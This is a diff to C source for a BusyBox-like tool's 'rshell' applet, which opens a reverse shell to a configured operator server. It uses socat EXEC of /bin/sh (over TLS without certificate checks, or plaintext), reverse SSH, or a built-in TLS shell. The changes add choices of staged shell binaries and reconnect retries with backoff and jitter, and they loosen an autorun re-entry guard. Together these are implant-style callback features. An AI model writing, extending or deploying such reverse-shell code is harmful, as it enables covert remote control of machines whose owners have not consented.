@@ -69,6 +69,27 @@
 #ifndef BB_RSHELL_SOCAT_PORT
 #define BB_RSHELL_SOCAT_PORT "22203"
 #endif
+#ifndef BB_RSHELL_SHELL_PROVIDER
+#define BB_RSHELL_SHELL_PROVIDER "auto"
+#endif
+#ifndef BB_RSHELL_CUSTOM_SHELL
+#define BB_RSHELL_CUSTOM_SHELL ""
+#endif
+#ifndef BB_RSHELL_RETRY_COUNT
+#define BB_RSHELL_RETRY_COUNT "1"
+#endif
+#ifndef BB_RSHELL_RETRY_INTERVAL_SEC
+#define BB_RSHELL_RETRY_INTERVAL_SEC "5"
+#endif
+#ifndef BB_RSHELL_RETRY_JITTER_PCT
+#define BB_RSHELL_RETRY_JITTER_PCT "20"
+#endif
+#ifndef BB_RSHELL_RETRY_BACKOFF
+#define BB_RSHELL_RETRY_BACKOFF "none"
+#endif
+#ifndef BB_RSHELL_RETRY_MAX_INTERVAL_SEC
+#define BB_RSHELL_RETRY_MAX_INTERVAL_SEC "300"
+#endif
 #ifndef BB_AUTORUN_GUARD_ENABLE
 #define BB_AUTORUN_GUARD_ENABLE "yes"
 #endif
@@ -248,8 +269,7 @@ static int acquire_autorun_guard(const char *mode)
     int fd;
     time_t now;
     if (!yes_value(BB_AUTORUN_GUARD_ENABLE) || !guard_needed(mode) ||
-        (!strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again") ||
-         !strcmp(BB_AUTORUN_REENTRY_ACTION, "shell-again")))
+        !strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again"))
         return 1;
     if (mkdir_p(guard_path) != 0) {
         fprintf(stderr, "autorun: unable to create guard path %s: %s\n", guard_path, strerror(errno));
@@ -316,25 +336,120 @@ static int path_exec(const char *path)
     return path && *path && access(path, X_OK) == 0;
 }
 
+static int parse_int_default(const char *s, int def)
+{
+    char *end = NULL;
+    long v;
+    if (!s || !*s)
+        return def;
+    v = strtol(s, &end, 10);
+    if (!end || *end)
+        return def;
+    if (v > 2147483647L)
+        return 2147483647;
+    if (v < -2147483647L)
+        return -2147483647;
+    return (int)v;
+}
+
+static int retry_delay_for_attempt(int attempt)
+{
+    int base = parse_int_default(BB_RSHELL_RETRY_INTERVAL_SEC, 5);
+    int max = parse_int_default(BB_RSHELL_RETRY_MAX_INTERVAL_SEC, 300);
+    int jitter = parse_int_default(BB_RSHELL_RETRY_JITTER_PCT, 20);
+    int delay = base;
+
+    if (base < 0)
+        base = 0;
+    if (max < base)
+        max = base;
+    if (!strcmp(BB_RSHELL_RETRY_BACKOFF, "linear"))
+        delay = base * (attempt + 1);
+    else if (!strcmp(BB_RSHELL_RETRY_BACKOFF, "exponential")) {
+        int i;
+        delay = base;
+        for (i = 0; i < attempt && delay < max; i++) {
+            if (delay > max / 2) {
+                delay = max;
+                break;
+            }
+            delay *= 2;
+        }
+    }
+    if (delay > max)
+        delay = max;
+    if (jitter > 0 && delay > 0) {
+        int span = (delay * jitter) / 100;
+        if (span > 0)
+            delay = delay - span + (int)(time(NULL) % (unsigned int)(span * 2 + 1));
+    }
+    return delay;
+}
+
+static int should_retry_after_attempt(int attempt)
+{
+    int retry_count = parse_int_default(BB_RSHELL_RETRY_COUNT, 1);
+    if (retry_count < 0)
+        return 1;
+    return attempt < retry_count;
+}
+
+static const char *select_rshell_shell(char *buf, size_t bufsz, const char *payload)
+{
+    const char *provider = BB_RSHELL_SHELL_PROVIDER;
+    char candidate[PATH_MAX];
+
+    if (!strcmp(provider, "custom")) {
+        snprintf(buf, bufsz, "%s", BB_RSHELL_CUSTOM_SHELL);
+        return buf;
+    }
+    if (!strcmp(provider, "target-sh") || !strcmp(BB_RUNTIME_MODE, "core-only")) {
+        snprintf(buf, bufsz, "%s", "/bin/sh");
+        return buf;
+    }
+    if (payload && *payload) {
+        if (!strcmp(provider, "payload-busybox-sh")) {
+            snprintf(buf, bufsz, "%s/bin/busybox sh", payload);
+            return buf;
+        }
+        if (!strcmp(provider, "payload-busybox-ash")) {
+            snprintf(buf, bufsz, "%s/bin/busybox ash", payload);
+            return buf;
+        }
+        if (!strcmp(provider, "payload-zsh")) {
+            snprintf(buf, bufsz, "%s/bin/zsh", payload);
+            return buf;
+        }
+        if (!strcmp(provider, "auto")) {
+            snprintf(candidate, sizeof(candidate), "%s/bin/busybox", payload);
+            if (path_exec(candidate)) {
+                snprintf(buf, bufsz, "%s sh", candidate);
+                return buf;
+            }
+        }
+    }
+    snprintf(buf, bufsz, "%s", "/bin/sh");
+    return buf;
+}
+
 int applet_rshell_main(int argc, char **argv)
 {
-    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX], socat[PATH_MAX];
+    char payload[PATH_MAX], busybox[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX], socat[PATH_MAX];
     char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
     char cmd[8192] = "";
+    char shell_cmd[PATH_MAX + 16];
     const char *subcmd = "start";
     const char *transport = BB_RSHELL_TRANSPORT;
     int i;
     int rc;
 
-    if (!strcmp(BB_RSHELL_TRANSPORT, "none")) {
-        fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
-        return 1;
-    }
-
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
         puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat|builtin]");
         puts("Starts or manages the configured reverse access transport.");
         printf("Configured transport: %s  encryption: %s\n", BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION);
+        printf("Shell provider: %s  retries: %s backoff=%s interval=%ss max=%ss\n",
+               BB_RSHELL_SHELL_PROVIDER, BB_RSHELL_RETRY_COUNT, BB_RSHELL_RETRY_BACKOFF,
+               BB_RSHELL_RETRY_INTERVAL_SEC, BB_RSHELL_RETRY_MAX_INTERVAL_SEC);
 #ifdef HAVE_WOLFSSL
         puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh), builtin (wolfSSL TLS shell).");
 #else
@@ -416,20 +531,33 @@ int applet_rshell_main(int argc, char **argv)
     if (!strcmp(transport, "socat-tls"))
         transport = "socat";
 
+    if (strcmp(transport, "ssh") && strcmp(transport, "socat") && strcmp(transport, "builtin") && strcmp(transport, "none")) {
+        fprintf(stderr, "rshell: unsupported transport '%s' (supported: ssh, socat, builtin)\n", transport);
+        return 2;
+    }
+    if (!strcmp(transport, "none")) {
+        fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
+        return 1;
+    }
+
     if (!strcmp(transport, "builtin")) {
 #ifdef HAVE_WOLFSSL
-        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls") || !strcmp(BB_BUILTIN_TLS_ENABLE, "yes"))
-            return rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
+        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls") || !strcmp(BB_BUILTIN_TLS_ENABLE, "yes")) {
+            int attempt;
+            select_rshell_shell(shell_cmd, sizeof(shell_cmd), NULL);
+            for (attempt = 0; ; attempt++) {
+                rc = rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT, shell_cmd);
+                if (rc == 0 || !should_retry_after_attempt(attempt))
+                    return rc;
+                sleep((unsigned int)retry_delay_for_attempt(attempt));
+            }
+        }
         fputs("rshell: builtin transport with encryption=none is not implemented\n", stderr);
         return 2;
 #else
         fputs("rshell: builtin transport requires wolfSSL; rebuild with BB_BUILTIN_TLS_ENABLE=yes\n", stderr);
         return 2;
 #endif
-    }
-    if (strcmp(transport, "ssh") && strcmp(transport, "socat")) {
-        fprintf(stderr, "rshell: unsupported transport '%s' (supported: ssh, socat, builtin)\n", transport);
-        return 2;
     }
     if (!strcmp(BB_RUNTIME_MODE, "core-only")) {
         fprintf(stderr, "rshell: transport '%s' requires staged payload tools but runtime mode is core-only\n", transport);
@@ -448,6 +576,7 @@ int applet_rshell_main(int argc, char **argv)
         return 127;
     }
     snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
+    snprintf(busybox, sizeof(busybox), "%s/bin/busybox", payload);
     snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
     snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
     snprintf(socat, sizeof(socat), "%s/bin/socat", payload);
@@ -455,18 +584,38 @@ int applet_rshell_main(int argc, char **argv)
     snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
     snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
     snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");
+    select_rshell_shell(shell_cmd, sizeof(shell_cmd), payload);
 
     if (!strcmp(transport, "socat")) {
         if (!path_exec(socat)) {
             fputs("rshell: socat transport requires staged socat; enable socat in Heavy tools and rebuild\n", stderr);
             return 127;
         }
+        if ((!strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-busybox-sh") ||
+             !strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-busybox-ash")) && !path_exec(busybox)) {
+            fputs("rshell: selected shell provider requires staged BusyBox\n", stderr);
+            return 127;
+        }
+        if (!strcmp(BB_RSHELL_SHELL_PROVIDER, "payload-zsh")) {
+            char zsh_path[PATH_MAX];
+            snprintf(zsh_path, sizeof(zsh_path), "%s/bin/zsh", payload);
+            if (!path_exec(zsh_path)) {
+                fputs("rshell: shell provider payload-zsh requires staged zsh; enable zsh in Heavy tools and rebuild\n", stderr);
+                return 127;
+            }
+        }
+        if (!strcmp(BB_RSHELL_SHELL_PROVIDER, "custom") && !BB_RSHELL_CUSTOM_SHELL[0]) {
+            fputs("rshell: shell provider custom requires BB_RSHELL_CUSTOM_SHELL\n", stderr);
+            return 2;
+        }
         if (!strcmp(BB_RSHELL_ENCRYPTION, "tls")) {
             strcat(cmd, "exec ");
             shquote_append(cmd, sizeof(cmd), socat);
             strcat(cmd, " OPENSSL:");
             shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT ",verify=0");
-            strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
+            strcat(cmd, " EXEC:");
+            shquote_append(cmd, sizeof(cmd), shell_cmd);
+            strcat(cmd, ",pty,stderr,setsid,sigint,sane");
         } else {
             /* plaintext — only when explicitly allowed */
             if (strcmp(BB_RSHELL_ALLOW_PLAINTEXT, "yes")) {
@@ -478,14 +627,22 @@ int applet_rshell_main(int argc, char **argv)
             shquote_append(cmd, sizeof(cmd), socat);
             strcat(cmd, " TCP:");
             shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT);
-            strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
+            strcat(cmd, " EXEC:");
+            shquote_append(cmd, sizeof(cmd), shell_cmd);
+            strcat(cmd, ",pty,stderr,setsid,sigint,sane");
         }
-        rc = system(cmd);
-        if (rc == -1)
-            return 1;
-        if (WIFEXITED(rc))
-            return WEXITSTATUS(rc);
-        return 1;
+        for (i = 0; ; i++) {
+            rc = system(cmd);
+            if (rc == -1)
+                rc = 1;
+            else if (WIFEXITED(rc))
+                rc = WEXITSTATUS(rc);
+            else
+                rc = 1;
+            if (rc == 0 || !should_retry_after_attempt(i))
+                return rc;
+            sleep((unsigned int)retry_delay_for_attempt(i));
+        }
     }
 
     if (!path_exec(dropbear) || !path_exec(dbclient)) {
